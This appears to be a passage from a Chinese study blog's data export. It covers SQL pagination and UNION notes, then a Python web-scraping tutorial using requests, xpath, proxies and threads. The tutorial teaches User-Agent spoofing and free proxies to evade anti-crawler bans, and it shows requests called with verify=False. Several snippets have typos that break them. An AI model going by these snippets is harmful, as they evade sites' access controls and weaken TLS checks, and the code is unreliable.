plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">案例：查询员工的部门名</span><br><span class=\"line\">select department_name</span><br><span class=\"line\">from departments d</span><br><span class=\"line\">where exists(</span><br><span class=\"line\">\tselect *</span><br><span class=\"line\">\tfrom employees e</span><br><span class=\"line\">\twhere d.&#x27;department_id&#x27;=e.&#x27;depaertment_id&#x27;</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"7、分页查询\"><a href=\"#7、分页查询\" class=\"headerlink\" title=\"7、分页查询\"></a>7、分页查询</h4><ol>\n<li>应用场景：当要显示的数据，一页显示不全，需要枫叶提交sql请求</li>\n<li>语法：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 查询列表</span><br><span class=\"line\">from 表</span><br><span class=\"line\">连接类型 join 表2</span><br><span class=\"line\">on 连接条件</span><br><span class=\"line\">where 筛选条件</span><br><span class=\"line\">group by 分组字段</span><br><span class=\"line\">having 分组后的筛选</span><br><span class=\"line\">order by 排序的字段</span><br><span class=\"line\">limit offset, size;</span><br><span class=\"line\"></span><br><span class=\"line\">offset要显示条目的起始索引（起始索引从0开始）</span><br><span class=\"line\">size 要显示的条目个数</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>案例：查询前五条员工信息</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from employees limit 0, 5;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>案例2：查询11条—第25条</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from employees limit 10, 15;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>案例3：有奖金的员工信息，并且工资较高的前10名显示出来</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select *</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where commission_pic is not null</span><br><span class=\"line\">order by salsry desc</span><br><span class=\"line\">limit 10;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>特点：</li>\n</ol>\n<ul>\n<li>limit语句放在查询语句德尔最后</li>\n<li>公式：要显示的页数page，每页的条目数size</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 查询列表</span><br><span class=\"line\">from 表</span><br><span class=\"line\">limit (page-1)*size, size;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"8、联合查询\"><a href=\"#8、联合查询\" class=\"headerlink\" title=\"8、联合查询\"></a>8、联合查询</h4><ol>\n<li>union联合 ：将多个查询语句的结果合并成一个结果</li>\n<li>语法：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查询语句1</span><br><span class=\"line\">union</span><br><span class=\"line\">查询语句2</span><br><span class=\"line\">union</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>案例：查询部门编号&gt;90或邮箱包含a的员工信息</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select *</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where email like &#x27;%a%&#x27; or deaprtment_id&gt;90;</span><br><span class=\"line\"></span><br><span class=\"line\">select *</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where email like &#x27;%a%&#x27;</span><br><span class=\"line\">union</span><br><span class=\"line\">select *</span><br><span class=\"line\">from employees</span><br><span class=\"line\">where deparment_id&gt;90;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>特点：</li>\n</ol>\n<ul>\n<li>要求多条查询语句的查询列数是一致的</li>\n<li>要求多条查询语句的查询的每一列的类型和顺序最好一致</li>\n<li>union关键字默认去重，如果使用union all 可以包含重复选项</li>\n</ul>"},{"title":"python爬虫技术","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_2.jpg","top":false,"_content":"\n# 爬虫第一天\n\n- urllib太过古老，因此不加以深入学习\n\n### requests\nrequests模块：python中原生的一款基于网络请求的模块，功能强大，简单便捷，效率高。\n作用：模拟浏览器发送请求。\n\n如何使用：（requests模块的编码流程）\n    -指定url\n    -发起请求（get或post）\n    -获取响应数据\n    -持久化存储（数据库或本地存储）\n\n环境安装：\n    -pip或pycharm安装\n    -anaconda自带（方便已装）\n    \n<!--more-->\n\n### **实战编码：**\n\n    - 需求：爬取拉勾网首页的数据\n        示例：\n\n```python\nimport requests\n\nif __name__ == '__main__':\n    #step 1:指定url\n    url = \"https://www.lagou.com/jobs/6889986.html?show=96e52fa1d2134ad483eac5662bcc9fc6\"\n\n    #step_2:发起请求\n    #get会返回一个响应对象\n    response = requests.get(url=url)\n\n    #step_3:获取相应数据(.text返回的是字符串形式的响应数据)\n    page_text = response.text\n    print(page_text)\n\n    #step_4:持久化存储\n    with open('./lagou.html', 'w', encoding = 'utf-8') as fp:\n        fp.write(page_text)\n    print('爬取数据结束')\n```\n- 以上代码极有可能会被网站捕获，被识别出为爬虫，所以需要实施反爬虫策略\n\n- 示例： \n  UA:User-Agent (请求载体的身份标识)\n  UA检测：门户网站的服务器会检测对应的载体身份标识，如果检测到请求的载体身份标识为某一款浏览器，\n  说明该请求是一个正常的请求。但是，如果监测到请求的载体身份标识不是基于某一款浏览器的，则表示\n  该请求为不正常的请求（爬虫），则服务器端就很有可能拒绝这次请求。\n  UA伪装:将对应的请求载体身份标识伪装成一款浏览器\n\n```python\nimport requests\n\nif __name__ == '__main__':\n    # UA伪装：将对应的User-Agent封装到一个字典中\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n\n    url = 'https://www.sogou.com/web?'\n\n    #处理url携带的参数：封装到字典中（参数为问号后面的）\n    kw = input('enter a word:')\n    param = {\n        'query': kw\n    }\n\n    # 需求的响应返回的是一个对象，对象应实例化\n    response = requests.get(url=url, params=param, headers=headers)\n\n    # 确认相应数据是txt类型的\n    page_text = response.text\n    fileName = kw+'.html'\n    with open(fileName, 'w', encoding='utf-8') as fp:\n        fp.write(page_text)\n    print('保存成功。。。')\n\n```\n\n# 爬虫第二天\n\n### 有关于ajax\n#### 爬取百度翻译的内容\n\n```python\nimport requests\nimport json\n\nif __name__ == '__main__':\n    #获取url\n    post_url = 'https://fanyi.baidu.com/sug'\n    #进行UA伪装\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n    #post请求的参数处理（同get请求一致）\n    word = input('输入你想翻译的东西:')\n    data = {\n        'kw': word\n    }\n    #发送请求并生成响应\n    response = requests.post(url=post_url, data=data, headers=headers)\n    #获取响应数据:\n    #json()方法返回的是obj （如果确认响应数据是json类型的）\n    dic_obj = response.json()\n\n    #持久化存储\n    filename = word+'.json'\n    with open(filename, 'w', encoding='utf-8') as fp:\n        json.dump(dic_obj, fp=fp, ensure_ascii=False)\n\n    #将jaon格式转化成dict格式\n    with open(filename, 'r', encoding='utf-8') as fp:\n        great = json.load(fp)\n\n    #将字典格式化输出(此字典中存在字典与列表的嵌套现象)\n    for k, v in great.items():\n        if type(v) == list:\n            for i in v:\n                print(i)\n        else:\n            print(k)\n            print(v)\n\n    print('end...')\n\n```\n\n### 爬取豆瓣电影信息\n\n```python\n##此处代码示例为失败的例子，未考虑到由ajax得到的页面依旧采用了ajax\n\nimport requests\nimport json\n\nif __name__ == '__main__':\n    url = 'https://movie.douban.com/j/chart/top_list'\n    param = {\n        'type': ' 24',\n        'interval_id': ' 100:90',\n        'action': '',\n        'start': ' 1',\n        'limit': ' 20',\n    }\n    headers = {\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n\n    response = requests.get(url=url, params=param, headers=headers)\n\n    list_data = response.json()\n\n    with open('./douban.json', 'w', encoding='utf-8') as fp:\n        json.dump(list_data, fp, ensure_ascii=False)\n\n    with open('./douban.json', 'r', encoding='utf-8') as fp:\n        great = json.load(fp)\n\n    print(great)\n```\n# 爬虫学习第三天\n### 爬取国家药监总局部分信息\n\n```python\nimport requests\nimport json\n\nif __name__ == '__main__':\n    url = 'http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsList'\n    url_2 = 'http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsById'\n    headers = {\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n    #爬取的页数\n    page_ = input(\"请输入您想爬取的信息页数：\")\n    for page in range(1, int(page_)+1):\n        data = {\n            'on': 'true',\n            'page': page,\n            'pageSize': '15',\n            'productName': '',\n            'conditionType': '1',\n            'applyname': '',\n            'applysn': '',\n        }\n        #id_list have many ids\n        id_list = []\n        message = []\n\n        json_list = requests.post(url=url, data=data, headers=headers).json()\n        #id_a is a dict\n        for id_a in json_list[\"list\"]:\n            id_list.append(id_a[\"ID\"])\n            #id_b是id号\n        for id_b in id_list:\n                data_2 = {\n                    \"id\": str(id_b)\n                }\n                detail_message = requests.post(url=url_2, data=data_2, headers=headers).json()\n                print(detail_message)\n                message.append(detail_message)\n    with open('./药物信息.json', 'w', encoding='utf-8') as fp:\n        json.dump(message, fp, ensure_ascii=False)\n    print('end...')\n\n'''此代码爬取时间可能有些长，也有可能会出现Timeouterror错误，多试几次可能就可以了'''\n'''出现这种情况的原因是对方服务器拒绝请求（反爬虫），，，后续继续学习反反爬虫技术'''\n```\n\n### 数据解析概述\n\n- 聚焦爬虫：爬取页面中指定的页面内容\n      -编码流程\n          1、指定url\n          2、发起请求\n          3、获取相应数据\n          4、持久化存储\n          \n  -数据解析分类：\n          -正则\n          -bs4\n          -xpath\n          \n  -数据解析原理概述\n          -解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储\n          -1、进行指定标签的定位\n          -2、标签或者标签对应属性中存储的数据值进行提取（解析）\n\n### 图片的爬取代码\n\n```python\nimport requests\n#此处url为图片地址，而非链接【地址比链接短】\nurl = 'https://tse4-mm.cn.bing.net/th/id/OIP.vLPcBX_5hWArkIbn_PqvYgHaGL?w=233&h=195&c=7&o=5&dpr=1.25&pid=1.7'\nheaders = {\n        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n}\n#图片以二进制的形式存储，所以以.content形式接收，以jpg格式存\ndata_pict = requests.get(url=url, headers=headers).content\nwith open('./beauty_pict.jpg', 'wb') as fp:\n    fp.write(data_pict)\n```\n\n# 爬虫第四天\n### 爬取百度图片（星空图片）\n\n```python\nimport requests\nimport re\nimport os\nimport time\n\nif __name__ == '__main__':\n    #创建一个文件夹，存放图片\n    if not os.path.exists('./star_sky'):\n        os.mkdir('./star_sky')\n        \n    url = 'https://cn.bing.com/images/search?q=%E6%98%9F%E7%A9%BA%E5%9B%BE%E7%89%87&qpvt=%e6%98%9f%e7%a9%ba%e5%9b%be%e7%89%87&form=IGRE&first=1&cw=1117&ch=714'\n    headers = {\n            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n    }\n    data_pict = requests.get(url=url, headers=headers).text\n\n    #正则匹配\n    ex = '<a class=.*?murl&quot;:&quot;(.*?)&quot;.*?>'\n    star_list = re.findall(ex, data_pict, re.S)\n    for i in star_list:\n        url_2 = i\n        #请求到了图片的二进制数据\n        data_2_pict = requests.get(url=url_2, headers=headers).content\n        #为图片设置名称\n        img_name = url_2.split(\"/\")[-1]\n        img_path = './star_sky/' + img_name\n        with open(img_path, 'wb') as fp:\n            fp.write(data_2_pict)\n        print(img_name + '...successful')\n        time.sleep(0.1)\n\n****************************************未完，，待更新********************************************\n```\n### xpath\n\n- xpath解析：最常用且最便捷高效的一种解析方式，具有通用性\n      -xpath解析原理：\n          -1、实例化一个etree对象，且需要将被解析的页面源码数据加载到该对象中\n          -2、调用etree对象中的xpath方法结合着xpath表达式实现标签的定位和内容的捕获\n      -如何实例化一个etree对象\n          *from lxml import etree\n          -1、将 本地的html文档中的源代码数据加载到etree对象中：\n              etree.parse(filepath)\n          -2、可以将从互联网上获取的数据加载到该对象中\n              etree.HTML('page_text')###page_text就是获取的响应数据\n          - xpath('xpath表达式')\n          -xpath表达式：\n                  - / ：表示的是从根目录结点开始定位，表示的是一个层级\n                          - // : 表示的是多个层级或从任意位置开始定位（前提是//前面没有结点）\n                          -属性定位：tag[@attrName=\"attrValue\"]\n                          -索引定位：p[n] 索引是从1开始的\n                          -取文本：\n              - /text() 获取的是标签中直系的文本内容\n              - //text() 标签中非直系的文本内容（所有的文本内容）\n              -[0] 可以去除列表框\n                  -取属性\n              -/@attrName\n              \n\n### xpath代码实战示例：\n\n```python\n#爬取妹子图片，总共有俩千多张\nimport requests\nfrom lxml import etree\nimport os\n\nif __name__ == '__main__':\n    ii = 1\n    if not os.path.exists('./girl'):\n        os.mkdir('./girl')\n    url_list = [i for i in range(1, 50)]\n    url_list[1] = ''\n\n    for page in url_list:\n        url = 'https://www.lanvshen.com/zhongguo/' + str(page) +'.html'\n        headers = {\n            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n        }\n        get_text = requests.get(url=url, headers=headers)\n        tree = etree.HTML(get_text.text)\n        pict_ = tree.xpath('//div[@class=\"hezi\"]//li')\n        for it_ in pict_:\n            img_url = it_.xpath('./a/img/@src')[0]\n            img_name = str(ii) + '.jpg'\n            img = requests.get(url=img_url, headers=headers).content\n            img_path = './girl/' + img_name\n            with open(img_path, 'wb') as fp:\n                fp.write(img)\n            print(img_name + 'sccuessful...')\n            ii = ii + 1\n\n##此代码存在许多不足之处，所爬取的图片都只是像素低的缩略图，并且下载速度较慢\n##后期将学习爬取高清图片，并进行分布式爬取\n\n```\n\n\n\n### ip代理\n\n1. 代理的原理：在请求目的网站之前，先请求代理服务器，然后让代理服务器去请求目的网站，\n   代理服务器拿到目的网站的数据后，再转发给我们的代码\n2. [这个网站可以方便的查看http请求的一些参数](http://httpbin.org) \n3. 在代码中(requests模块)使用代理：\n\n```python\n\timport requests\n\n\turl = 'http://httpbin.org'\n\theaders = {\n\t\t'User-Anget': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'\n\t}\n\n\t#设置代理\n\tproxy = {\n\t\t'http': '123.54.194.96:38661'\n\t}\n\tget_text = requerts.get(url=url, headers=headers, proxies=proxy).text\n\tprint(get_text)\n```\n\n4. 网络代理有付费和不需要付费的，不需要付费的不稳定，常常会失效\n5. 代理的作用是防止我们在爬取服务器的数据时被反爬虫而被封禁导致我们\n   的 ip 不能用而采取的措施，选择代理应选择隐蔽性高，不透明的\n\n### cookie \n\n* [cookie与session的差异](http://blog.sina.com.cn/s/blog_628571e601019uis.html)\n\n* [cookie技术深入](http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=200538817&idx=2&sn=1147d48f2320fa37e82a7daef4f31c11#rd )\t\t\t \n\n  - Cookie是什么？\t \n\n  Cookie 是一小段文本信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。\n  Cookie 包含每次用户访问站点时 Web 应用程序都可以读取的信息。\n\n  - 为什么需要Cookie？ \n\n    因为HTTP协议是无状态的，对于一个浏览器发出的多次请求，WEB服务器无法区分 是不是来源于同一个浏览器。\n    所以，需要额外的数据用于维护会话。Cookie 正是这样的一段随HTTP请求一起被传递的额外数据。\n\n  - Cookie能做什么？ \n\n    Cookie只是一段文本，所以它只能保存字符串。而且浏览器对它有大小限制以及 它会随着每次请求被发送到服务器，所以应该保证它\n    不要太大。Cookie的内容也是明文保存的，有些浏览器提供界面修改，所以， 不适合保存重要的或者涉及隐私的内容。\n\n  - Cookie 的限制\n\n    大多数浏览器支持最大为 4096 字节的 Cookie。由于这限制了 Cookie 的大小，最好用 Cookie 来存储少量数据，\n    或者存储用户 ID 之类的标识符。用户 ID 随后便可用于标识用户，以及从数据库或其他数据源中读取用户信息。 \n    浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；\n    如果试图存储更多 Cookie，则最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie\n    总数作出绝对限制，通常为 300 个。\n\n![Cookie示意图](C:/Users/Acer/Desktop/笔记/爬虫_day4_files/1.jpg)\t\n\n- 处理cookie\n  如果想要在多次请求中共享cookie，那么应该使用session\n\n### 处理不信任的SSL证书\n\n```python\nresp = resquests.get(url=url, vrrify=False).content\n\n```\n\n### 多线程\n\n* 多线程之生产者与消费者模型\n\n- 代码示例一：(Lock版)\n\n```python\n\t\"\"\"\n\t关于多线程生产者消费者模型\n\t\"\"\"\n\timport threading\n\timport time\n\timport random\n\n\tgMoney = 1000\n\tgLock = threading.Lock()\n\tgTotalTimes = 10\n\tgTimes = 0\n\n\n\t# 生产线程Producer\n\tclass Producer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\tglobal gTimes\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgLock.acquire()\n\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\tgLock.release()\n\t\t\t\t\tbreak\n\t\t\t\tgMoney += money\n\t\t\t\tprint('{}生产了{}元钱，剩余{}元钱'\n\t\t\t\t\t  .format(threading.current_thread(), money, gMoney))\n\t\t\t\tgTimes += 1\n\t\t\t\tgLock.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\t# 消费线程Consumer\n\tclass Consumer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgLock.acquire()\n\t\t\t\tif gMoney >= money:\n\t\t\t\t\tgMoney -= money\n\t\t\t\t\tprint('{}消费者消费了{}元钱，剩余{}元钱'\n\t\t\t\t\t\t  .format(threading.current_thread(), money, gMoney))\n\t\t\t\t# 若剩余金额不足以消费，则退出循环\n\t\t\t\telse:\n\t\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\t\tgLock.release()\n\t\t\t\t\t\tbreak\n\t\t\t\t\tprint('{}消费者准备消费{}元钱，剩余{}元钱，不足！'\n\t\t\t\t\t\t  .format(threading.current_thread(), money, gMoney))\n\t\t\t\tgLock.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\tdef mainIt():\n\t\t# 设置3个消费线程\n\t\tfor x in range(3):\n\t\t\tt = Consumer(name='消费者线程{}'.format(x))\n\t\t\tt.start()\n\t\t\t# 设置5个生产线程\n\n\t\tfor x in range(5):\n\t\t\tt = Producer(name='生产者线程{}'.format(x))\n\t\t\tt.start()\n\n\n\tif __name__ == '__main__':\n\t\tmainIt()\n\n```\n\n- 代码示例二：(condition版)\n\n```python\n \n\timport threading\n\timport random\n\timport time\n\n\tgMoney = 1000\n\tgCondition = threading.Condition()  # 等同于threading.Lock\n\tgTimes = 0\n\tgTotalTimes = 5\n\t\n\n\tclass Producer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\tglobal gCondition\n\t\t\tglobal gTimes\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgCondition.acquire()  # 加锁（全局变量改变前（gMoney））\n\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\tgCondition.release()  # 解锁\n\t\t\t\t\tprint(\"当前生产者总共生产了%s次\" % gTimes)\n\t\t\t\t\tbreak\n\t\t\t\tgMoney += money\n\t\t\t\tprint(\"%s当前存入%s元钱，剩余%s元线\" % (threading.current_thread(), money, gMoney))\n\t\t\t\tgTimes += 1\n\t\t\t\tgCondition.notify_all()  # 通知正在等待的线程（wait）\n\t\t\t\tgCondition.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\tclass Cosumer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal gMoney\n\t\t\twhile True:\n\t\t\t\tmoney = random.randint(100, 1000)\n\t\t\t\tgCondition.acquire()\n\t\t\t\twhile gMoney < money:\n\t\t\t\t\tif gTimes >= gTotalTimes:\n\t\t\t\t\t\tgCondition.release()\n\t\t\t\t\t\treturn\n\t\t\t\t\tprint(\"%s准备消费%d元钱，剩余%d元钱，不足\" % (threading.current_thread(), money, gMoney))\n\t\t\t\t\tgCondition.wait()  # 等待状态  （获取锁） 直到生产者把钱加上 （有钱了再去排队消费）\n\t\t\t\tgMoney -= money\n\t\t\t\tprint(\"%s消费了%d元钱，剩余%d元钱\" % (threading.current_thread(), money, gMoney))\n\t\t\t\tgCondition.release()\n\t\t\t\ttime.sleep(0.5)\n\n\n\tdef main():\n\t\tfor x in range(3):\n\t\t\tt = Cosumer(name=\"消费者线程%s\" % x)\n\t\t\tt.start()\n\t\tfor y in range(5):\n\t\t\tt1 = Producer(name=\"生产者线程%s\" % y)\n\t\t\tt1.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n- 多线程Lock与condition方法总结：\n  1. 在上述的例子中，lock方法虽然实现了多线程的使用，但是当消费者资金不足时，程序在当前线程会重新whlie True，\n     这就导致了该线程需要再次上锁和解锁，这就导致了CPU的浪费\n  2. 当我们使用condition方法时，每当消费者资金不足，该线程无需重新while True，也不需要再次的上锁和解锁，\n     使用wait()，使当资金不足时的消费者线程在wait()暂停并解锁，等待条件满足时再次从wait()处开始执行，这样就\n     减少了循环过程中因上锁解锁而导致的CPu资源浪费\n\n* Queue线程安全队列\n  在线程中，访问一些全局变量，枷锁是一个经常的过程，如果你是想把某个数据存储到某个队列中，那么python内置了一个线程安全的模块\n  叫做queue模块。python中的queue模块中提供了同步的、线程安全的模块，其中队列Queue为先进先出，实现了原子操作，即要么不做，要\n  么做完。可使用队列来实现线程的同步。相关函数如下：\n  作用：\n  　　　解耦：使程序直接实现松耦合，修改一个函数，不会有串联关系。\n  　　　提高处理效率：ＦＩＦＯ　＝　现进先出，ＬＩＦＯ　＝　后入先出。\n\n1. Queue.Queue(maxsize=0)   FIFO， 如果maxsize小于1就表示队列长度无限\n\n2. Queue.LifoQueue(maxsize=0)   LIFO， 如果maxsize小于1就表示队列长度无限\n\n3. Queue.qsize()   返回队列的大小\n\n4. Queue.empty()   如果队列为空，返回True,反之False\n\n5. Queue.full()   如果队列满了，返回True,反之False\n\n6. Queue.get([block[, timeout]])   读队列，取出数据 ，没有数据将会等待timeout等待时间\n\n7. Queue.put(item, [block[, timeout]])   写队列，放入数据，timeout等待时间\n\n8. Queue.queue.clear()   清空队列\n\n9. class queue.PriorityQueue(maxsize=0) 存储数据时可设置优先级的队列，优先级设置数越小等级越高\n\n10. Queue.get(timeout = 1)如果1秒后没取到数据就退出\n\n11. Queue.get_nowait() 取数据，如果没数据抛queue.Empty异常\n\n12. Queue.task_done()后续调用告诉队列，任务的处理是完整的。\n\n```python\n\tfrom queue import Queue\n\timport time\n\timport threading\n\n\n\t# 在队列中放入数值\n\tdef set_value(q):\n\t\tindex = 0\n\t\twhile True:\n\t\t\tq.put(index)\n\t\t\tindex += 1\n\t\t\ttime.sleep(0.8)\n\n\n\t# 取出队列中的数值\n\tdef get_value(q):\n\t\twhile True:\n\t\t\tprint(q.get())\n\n\n\tdef main():\n\t\t# 产生一个队列\n\t\tq = Queue(1)\n\t\tt1 = threading.Thread(target=set_value, args=[q])\n\t\tt2 = threading.Thread(target=get_value, args=[q])\n\n\t\tt1.start()\n\t\tt2.start()\n\n\n\tif __name__ == '__main__':\n\t\tmain()\n\n```\n\n* 生产者与消费者模型\n\n- 代码示例三：(Queue版)\n\n```python\n\timport threading,time\n\t#python2  from Queue import Queue\n\t#python3\n\timport queue\n\t \n\tclass Producer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal queue\n\t\t\tcount = 0\n\t\t\twhile True:\n\t\t\t\t#qsize返回queue内部长度\n\t\t\t\tif queue.qsize() < 1000:\n\t\t\t\t\tfor i in range(100):\n\t\t\t\t\t\tcount += 1\n\t\t\t\t\t\tmsg = '生成产量'+str(count)\n\t\t\t\t\t\t#put是往queue中放入\n\t\t\t\t\t\tqueue.put(msg)\n\t\t\t\t\t\tprint(msg)\n\t\t\t\ttime.sleep(0.5)\n\tclass Consumer(threading.Thread):\n\t\tdef run(self):\n\t\t\tglobal queue\n\t\t\twhile True:\n\t\t\t\tif queue.qsize() > 100:\n\t\t\t\t\tfor i in range(3):\n\t\t\t\t\t\t#get从queue中取出一个值\n\t\t\t\t\t\tmsg = self.name + \"消费了\"+queue.get()\n\t\t\t\t\t\tprint(msg)\n\t\t\t\ttime.sleep(1)\n\tif __name__ == '__main__':\n\t\tqueue = queue.Queue()\n\t\tfor i in range(500):\n\t\t\tqueue.put(\"初始产品\"+str(i))\n\t\tfor i in range(2):\n\t\t\tp = Producer()\n\t\t\tp.start()\n\t\tfor i in range(5):\n\t\t\tc = Consumer()\n\t\t\tc.start()\n\t\t\t\n```\n\n### 爬虫之多线程\n\n* 多线程爬虫框架代码\n\n```python\n\timport requests\n\tfrom lxml import etree\n\timport os\n\timport re\n\tfrom queue import Queue\n\timport threading\n\n\t\"\"\" \n\t我们引入了threading这个包，我们将使用这个包中的\n\tThread类，并在我们自定义的类中继承这个Thread类\n\t\"\"\"\n\n\n\t# 生产者线程\n\tclass Procuder(threading.Thread):\n\t\theaders = {\n\t\t\t\t'User-Agent': '... 浏览器...'\n\t\t}\n\n\t\t\"\"\" 重写继承于父类的__init__方法 \"\"\"\n\t\t\"\"\" 我们继承了Thread这个类，在调用类中的方法时可能需要许多参数，我们用*args和**kwargs来接收\"\"\"\n\t\tdef __init__(self, page_queue, img_queue, *args, **kwargs):\n\t\t\tsuper(Procuder, self).__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\n\t\t\"\"\" 重写继承于父类的run方法，改成我们想要的方法\"\"\"\n\t\t\"\"\" 从存放每页的url的队列中逐一挑出一个url并传入parse_page中\n\t\t\t获取每页的url\n\t\t\"\"\"\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\turl = self.page_queue.get()\n\t\t\t\tself.parse_page(url)\n\n\t\tdef parse_page(self, url):\n\t\t\t\"\"\" \n\t\t\t.......\n\t\t\t\n\t\t\t获取每页的响应数据，并从中提取出每张图片的\n\t\t\turl和name，并放入队列中\n\t\t\t\"\"\"\n\n\n\t# 消费者线程\n\tclass Consumer(threading.Thread):\n\t\tdef __init__(self, page_queue, img_queue, *args, **kwargs):\n\t\t\tsuper(Procuder, self).__init__(*args, **kwargs)\n\t\t\tself.page_queue = page_queue\n\t\t\tself.img_queue = img_queue\n\n\t\tdef run(self):\n\t\t\twhile True:\n\t\t\t\tif self.img_queue.empty() and self.page_queue.empty():\n\t\t\t\t\tbreak\n\t\t\t\t\t\"\"\"\n\t\t\t\t\t......\n\t\t\t\t\t\n\t\t\t\t\t利用从队列中获取的每张图片的url和name，进行图片的获取和永久储存\n\t\t\t\t\t\"\"\"\n\n\tdef main():\n\t\t\"\"\" 设置页数和图片的url队列\"\"\"\n\t\tpage_queue = Queue()\n\t\timg_queue = Queue()\n\n\t\t# 将每页的url放到页数队列中\n\t\tfor x in range(1, 101):\n\t\t\turl = 'http://........ %d' % x\n\t\t\tpage_queue.put(url)\n\n\t\t# 设置5个生产者线程\n\t\tfor x in range(5):\n\t\t\tt = 